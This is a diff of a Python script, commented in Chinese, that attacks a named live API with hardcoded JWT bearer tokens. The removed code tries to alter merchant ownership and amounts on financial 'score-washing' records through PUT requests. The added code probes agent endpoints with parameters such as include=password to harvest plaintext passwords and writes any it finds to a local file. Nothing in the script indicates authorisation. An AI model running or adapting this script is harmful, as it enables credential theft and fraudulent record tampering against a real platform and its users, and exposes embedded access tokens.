@@ -1,278 +1,178 @@
 import requests
 import json
+from datetime import datetime
 
-ADMIN_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3dwYXBpLmxkanptci50b3AvYWRtaW4vbG9naW4iLCJpYXQiOjE3NzEwMDk2NTksImV4cCI6MTgwMjU0NTY1OSwibmJmIjoxNzcxMDA5NjU5LCJqdGkiOiJzWXJFVE0wUEJNOXBNTUVOIiwic3ViIjoiOTk5IiwicHJ2IjoiNzIzNDlhZmZkYTA0NGRjMmFkNzBhMzllZjE1MTYzZWE2N2E3MzMxMyJ9.WGfPfTVyEe2PGdkPcN1Im3ig0t0-hWmHtCx00t3rFUs"
+BRAND_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3dwYXBpLmxkanptci50b3AvYWdlbnQvbG9naW4iLCJpYXQiOjE3NzEwODI3NTIsImV4cCI6MTgwMjYxODc1MiwibmJmIjoxNzcxMDgyNzUyLCJqdGkiOiJ0aUxUYnI0NHY3Uk5MR0ZHIiwic3ViIjoiMjYiLCJwcnYiOiI1OGRmOTdjNzY3Y2Y2NmYwODFmOWNiZmNjNWEwMGIwN2Y1MmYyYTJiIn0._G0stJUeBYnkjClTshg2fIOsjnE2PWdYURD2Kqyoxk8"
 
 BASE_URL = "https://wpapi.ldjzmr.top"
 
 headers = {
-    "Authorization": f"Bearer {ADMIN_TOKEN}",
-    "Content-Type": "application/json",
-    "Accept": "application/json"
+    "Authorization": f"Bearer {BRAND_TOKEN}",
+    "Content-Type": "application/json"
 }
 
 print("="*120)
-print("🔍 對比分析：為什麼遊戲可以 PUT，洗分記錄不行？")
+print("🔥 測試 /agent/agent 端點 - 尋找代理列表")
 print("="*120 + "\n")
 
 # ============================================================================
-# 測試 1: 先確認遊戲 PUT 仍然可行
+# 測試不同的參數組合
 # ============================================================================
-print("📍 測試 1: 確認遊戲轉移仍然可行")
-print("-"*120 + "\n")
 
-# 隨便找一個遊戲 ID 測試
-test_game_id = 99121  # 你之前測試過的
-
-try:
-    # 先獲取遊戲資料
-    game_response = requests.get(
-        f"{BASE_URL}/admin/platform_game",
-        headers=headers
-    )
+test_variations = [
+    # 基本請求
+    "/agent/agent",
     
-    if game_response.status_code == 200:
-        game_data = game_response.json()
-        
-        if 'data' in game_data:
-            games = game_data['data'].get('data', [])
-            
-            if games:
-                test_game = games[0]
-                test_game_id = test_game['id']
-                current_brand = test_game['brand_id']
-                
-                print(f"測試遊戲: ID={test_game_id}, 當前 brand_id={current_brand}")
-                
-                # 嘗試 PUT（不真的改，只測試是否返回 500）
-                test_put = requests.put(
-                    f"{BASE_URL}/admin/platform_game/{test_game_id}",
-                    headers=headers,
-                    json={"brand_id": current_brand},  # 改成同樣的值
-                    timeout=10
-                )
-                
-                print(f"PUT /admin/platform_game/{test_game_id}")
-                print(f"狀態碼: {test_put.status_code}")
-                
-                if test_put.status_code == 200:
-                    print(f"✓ 遊戲的 PUT 請求成功（狀態 200）\n")
-                elif test_put.status_code == 500:
-                    print(f"✗ 遊戲的 PUT 也返回 500\n")
-                else:
-                    print(f"其他狀態: {test_put.status_code}\n")
-                    
-except Exception as e:
-    print(f"錯誤: {e}\n")
-
-# ============================================================================
-# 測試 2: 對比 API 路由結構
-# ============================================================================
-print("="*120)
-print("📍 測試 2: 對比後端路由設計")
-print("-"*120 + "\n")
-
-print("推測的後端路由差異:\n")
-
-print("遊戲路由（允許修改）:")
-print("""
-Route::put('/admin/platform_game/{id}', function($id) {
-    $game = PlatformGame::find($id);
+    # 帶分頁參數
+    "/agent/agent?page=1",
+    "/agent/agent?pagenum=1&pagesize=100",
+    "/agent/agent?per_page=100",
     
-    // ✓ 允許修改所有欄位（包括 brand_id）
-    $game->update($request->all());
+    # 帶篩選參數
+    "/agent/agent?all=1",
+    "/agent/agent?list=1",
+    "/agent/agent?show_all=true",
     
-    return response()->json(['code' => 0]);
-});
-""")
-
-print("洗分記錄路由（禁止修改）:")
-print("""
-Route::put('/admin/banknote_log/{id}', function($id) {
-    $log = BanknoteLog::find($id);
-    
-    // ❌ 可能有保護機制
-    if (isset($request->brand_id)) {
-        abort(500, '不允許修改商戶歸屬');  // ← 返回 500 錯誤
-    }
-    
-    $log->update($request->except(['brand_id']));  // 排除 brand_id
-    
-    return response()->json(['code' => 0]);
-});
-""")
-
-# ============================================================================
-# 測試 3: 檢查錯誤訊息
-# ============================================================================
-print("="*120)
-print("📍 測試 3: 詳細檢查 500 錯誤內容")
-print("-"*120 + "\n")
-
-record_id = 327880
-
-try:
-    # 發送 PUT 請求
-    response = requests.put(
-        f"{BASE_URL}/admin/banknote_log/{record_id}",
-        headers=headers,
-        json={"brand_id": 11},
-        timeout=10
-    )
-    
-    print(f"PUT /admin/banknote_log/{record_id}")
-    print(f"資料: {{'brand_id': 11}}")
-    print(f"狀態碼: {response.status_code}\n")
-    
-    print("完整回應:")
-    print(response.text)
-    print()
-    
-    # 嘗試解析錯誤
-    try:
-        error_data = response.json()
-        print("解析後的錯誤:")
-        print(json.dumps(error_data, ensure_ascii=False, indent=2))
-        
-        # 檢查是否有具體錯誤訊息
-        if 'message' in error_data:
-            print(f"\n錯誤訊息: {error_data['message']}")
-            
-            if 'brand_id' in error_data['message'].lower():
-                print("✓ 錯誤訊息包含 'brand_id'，確認是針對這個欄位的保護")
-            
-    except:
-        print("無法解析為 JSON")
-        
-except Exception as e:
-    print(f"請求錯誤: {e}")
-
-# ============================================================================
-# 測試 4: 嘗試修改其他欄位（排除 brand_id）
-# ============================================================================
-print("\n" + "="*120)
-print("📍 測試 4: 嘗試修改其他欄位（不含 brand_id）")
-print("-"*120 + "\n")
-
-# 嘗試只修改其他欄位
-other_fields_tests = [
-    {"amount": 500, "note": "只改金額"},
-    {"is_check_out": 1, "note": "只改結帳狀態"},
-    {"brand_ratio": "0.30", "note": "只改比例"},
+    # 帶欄位參數
+    "/agent/agent?fields=*",
+    "/agent/agent?include=password",
+    "/agent/agent?with=credentials",
 ]
 
-for test in other_fields_tests:
-    note = test.pop('note')
-    
-    print(f"測試: {note}")
-    print(f"資料: {json.dumps(test, ensure_ascii=False)}")
+successful_endpoints = []
+
+for endpoint in test_variations:
+    print(f"測試: {endpoint:60} ", end='')
     
     try:
-        response = requests.put(
-            f"{BASE_URL}/admin/banknote_log/{record_id}",
-            headers=headers,
-            json=test,
-            timeout=10
-        )
+        response = requests.get(f"{BASE_URL}{endpoint}", headers=headers, timeout=10)
         
-        print(f"狀態: {response.status_code}", end='')
+        print(f"HTTP {response.status_code} ", end='')
         
         if response.status_code == 200:
-            result = response.json()
-            if result.get('code') == 0:
-                print(f" ✓ 成功！其他欄位可以修改")
+            data = response.json()
+            
+            print(f"code={data.get('code')} ", end='')
+            
+            if data.get('code') == 0:
+                print("✅")
+                
+                # 分析返回的資料結構
+                print(f"\n{'  '*2}資料結構分析:")
+                print(f"{'  '*2}{'─'*80}")
+                
+                # 顯示完整 JSON（前 500 字元）
+                json_str = json.dumps(data, ensure_ascii=False, indent=2)
+                print(f"{'  '*2}完整 JSON (前 500 字元):")
+                print(f"{'  '*2}{json_str[:500]}")
+                print()
+                
+                # 檢查是否包含代理列表
+                if 'data' in data:
+                    data_content = data['data']
+                    
+                    # 情況 1: data 是陣列
+                    if isinstance(data_content, list):
+                        print(f"{'  '*2}✓ 返回陣列，共 {len(data_content)} 個項目")
+                        
+                        if len(data_content) > 0:
+                            print(f"{'  '*2}第一個項目的欄位:")
+                            first_item = data_content[0]
+                            
+                            for key in sorted(first_item.keys()):
+                                value = first_item[key]
+                                
+                                # 標記可能是密碼的欄位
+                                is_password = False
+                                if 'password' in key.lower():
+                                    # 檢查是否是明文（不是 bcrypt）
+                                    if isinstance(value, str) and not value.startswith('$2y$'):
+                                        is_password = True
+                                
+                                marker = "🔑" if is_password else "  "
+                                
+                                if isinstance(value, str):
+                                    display = f'"{value[:50]}"' if len(str(value)) > 50 else f'"{value}"'
+                                else:
+                                    display = str(value)
+                                
+                                print(f"{'  '*2}{marker} {key:25} = {display}")
+                            
+                            # 檢查是否有明文密碼
+                            has_plain_pwd = any(
+                                'password' in k.lower() and 
+                                isinstance(first_item[k], str) and 
+                                not first_item[k].startswith('$2y$')
+                                for k in first_item.keys()
+                            )
+                            
+                            if has_plain_pwd:
+                                print(f"\n{'  '*2}🎉 找到明文密碼欄位！")
+                                successful_endpoints.append({
+                                    'endpoint': endpoint,
+                                    'data': data
+                                })
+                        
+                    # 情況 2: data 是物件（可能包含 data, list, items 等）
+                    elif isinstance(data_content, dict):
+                        print(f"{'  '*2}✓ 返回物件")
+                        print(f"{'  '*2}物件的 keys: {list(data_content.keys())}")
+                        
+                        # 檢查常見的列表欄位
+                        for list_key in ['data', 'list', 'items', 'agents', 'records']:
+                            if list_key in data_content:
+                                items = data_content[list_key]
+                                
+                                if isinstance(items, list) and len(items) > 0:
+                                    print(f"{'  '*2}找到列表欄位 '{list_key}', 共 {len(items)} 個項目")
+                                    
+                                    first_item = items[0]
+                                    print(f"{'  '*2}第一個項目的欄位: {list(first_item.keys())[:10]}")
+                    
+                    # 情況 3: 其他類型
+                    else:
+                        print(f"{'  '*2}資料類型: {type(data_content)}")
+                
+                print()
             else:
-                print(f" ✗ 失敗: {result.get('msg')}")
-        elif response.status_code == 500:
-            print(f" ✗ 500 錯誤（所有修改都被禁止）")
+                print(f"✗ msg={data.get('msg')}")
         else:
-            print(f" ? {response.status_code}")
-        
-        print("\n")
-        
+            print("✗")
+            
     except Exception as e:
-        print(f" 異常: {e}\n")
+        print(f"✗ 錯誤: {str(e)[:30]}")
+    
+    print()
 
 # ============================================================================
-# 測試 5: 檢查是否有專門的唯讀欄位保護
+# 結果總結
 # ============================================================================
 print("="*120)
-print("📍 測試 5: 發送完整資料（包含 brand_id）")
-print("-"*120 + "\n")
+print("📊 測試結果")
+print("="*120 + "\n")
 
-full_data = {
-    "machine_no": "af2e6edc09a4230c",
-    "machine_id": 15,
-    "uid": 17,
-    "brand_id": 11,  # ← 夾帶在完整資料中
-    "agent_id": 16,
-    "amount": 500,
-    "currency": 1,
-    "up_score_type": 1,
-    "currency_type": 2,
-    "brand_ratio": "0.30",
-    "is_check_out": 0
-}
-
-print("發送完整資料（夾帶 brand_id）:")
-print(json.dumps(full_data, ensure_ascii=False, indent=2))
-
-try:
-    response = requests.put(
-        f"{BASE_URL}/admin/banknote_log/{record_id}",
-        headers=headers,
-        json=full_data,
-        timeout=10
-    )
+if successful_endpoints:
+    print(f"🎉 找到 {len(successful_endpoints)} 個包含明文密碼的端點！\n")
     
-    print(f"\n狀態: {response.status_code}")
-    
-    if response.status_code == 200:
-        result = response.json()
-        if result.get('code') == 0:
-            print(f"✅ 成功！夾帶 brand_id 在完整資料中可行")
-        else:
-            print(f"❌ 失敗: {result.get('msg')}")
-    elif response.status_code == 500:
-        print(f"❌ 500 錯誤")
-        error_data = response.json()
-        print(f"錯誤: {error_data.get('message', 'N/A')}")
+    for item in successful_endpoints:
+        print(f"端點: {item['endpoint']}")
+        print(f"資料預覽:")
+        print(json.dumps(item['data'], ensure_ascii=False, indent=2)[:500])
+        print("\n" + "="*120 + "\n")
         
-except Exception as e:
-    print(f"異常: {e}")
-
-# ============================================================================
-# 最終分析
-# ============================================================================
-print("\n" + "="*120)
-print("📊 最終分析")
-print("="*120)
-print("""
-為什麼遊戲可以 PUT 但洗分記錄不行？
-
-可能的原因:
-
-1. 後端有欄位白名單/黑名單:
-   - 遊戲: 允許修改所有欄位
-   - 洗分記錄: brand_id 在黑名單中
-   
-2. 後端有業務邏輯保護:
-   - 遊戲: 沒有特殊保護
-   - 洗分記錄: 檢測到 brand_id 就拋出 500 錯誤
-   
-3. 不同的控制器實現:
-   - 遊戲控制器: $game->update($request->all())
-   - 洗分控制器: $log->update($request->except(['brand_id']))
-   
-4. 資料庫層面保護:
-   - brand_id 欄位可能被設為唯讀
-   - 或有資料庫觸發器阻止修改
-   
-這是好消息！
-✓ 至少財務記錄的商戶歸屬受到了保護
-✓ 工程師在洗分記錄上比遊戲更謹慎
-""")
+        # 保存完整資料
+        filename = f"agent_passwords_found_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+        with open(filename, 'w', encoding='utf-8') as f:
+            json.dump(item['data'], f, ensure_ascii=False, indent=2)
+        
+        print(f"✓ 完整資料已保存: {filename}\n")
+else:
+    print("❌ 沒有找到包含明文密碼的端點\n")
+    print("建議:")
+    print("  1. 檢查上面的輸出，看看返回了什麼資料結構")
+    print("  2. 如果返回的是代理列表，看看每個代理有哪些欄位")
+    print("  3. 可能需要用其他方法獲取密碼\n")
 
 print("="*120)
-print("測試完成！")
+print("測試完成")
 print("="*120)
